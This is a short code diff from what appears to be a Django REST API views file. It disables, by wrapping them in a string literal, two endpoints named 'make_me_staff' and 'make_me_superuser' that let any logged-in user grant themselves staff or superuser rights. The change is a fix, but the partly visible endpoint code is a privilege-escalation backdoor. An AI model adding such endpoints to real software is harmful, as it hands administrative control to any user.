@@ -272,7 +272,7 @@ class CommentDelete(generics.DestroyAPIView):
         if instance.user != self.request.user and not self.request.user.is_staff:
             raise permissions.PermissionDenied("Not your comment.")
         super().perform_destroy(instance)
-
+'''
 @api_view(['POST'])
 @permission_classes([IsAuthenticated])
 def make_me_staff(request):
@@ -289,4 +289,4 @@ def make_me_superuser(request):
     user.is_superuser = True
     user.save()
     return Response({"message": f"{user.username} is now a superuser."})
-
+'''
